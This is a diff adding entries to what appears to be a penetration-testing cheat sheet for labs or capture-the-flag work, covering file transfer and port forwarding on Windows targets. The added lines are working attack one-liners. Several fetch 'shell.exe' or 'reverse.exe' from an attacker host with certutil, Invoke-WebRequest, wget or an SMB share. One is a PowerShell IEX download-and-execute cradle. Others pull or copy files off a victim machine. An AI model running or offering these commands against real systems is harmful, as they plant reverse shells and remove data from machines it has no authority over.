@@ -116,6 +116,10 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username use
 net use \\10.10.16.5\share /u:user pass   # On victim
 copy C:\Users\user\Desktop\somefile.txt \\10.10.16.5\share\somefile.txt   # On victim
 ```
+via pscp:
+```
+pscp Administrator@10.10.10.10:/Users/Administrator/Downloads/something.txt
+```
 
 ## Port forwarding
 ### SSH:
@@ -135,4 +139,26 @@ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
 ```
 
 ## Transfering files
+### Windows
+cmd:
+```
+iwr -uri "http://10.10.10.10:8080/shell.exe" -outfile "shell.exe"
 
+wget -O shell.exe 10.10.10.10:8000/shell.exe
+
+certutil -urlcache -f  http://10.10.10.10:8000/shell.exe C:\inetpub\shell.exe
+```
+Powershell:
+```
+Invoke-WebRequest http://10.10.10.10:8000/shell.exe -OutFile shell.exe
+
+powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/shell.exe', 'shell.exe')"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/something.ps1')"
+```
+via SMB:
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .    # On attacker
+
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe    # On target
+```
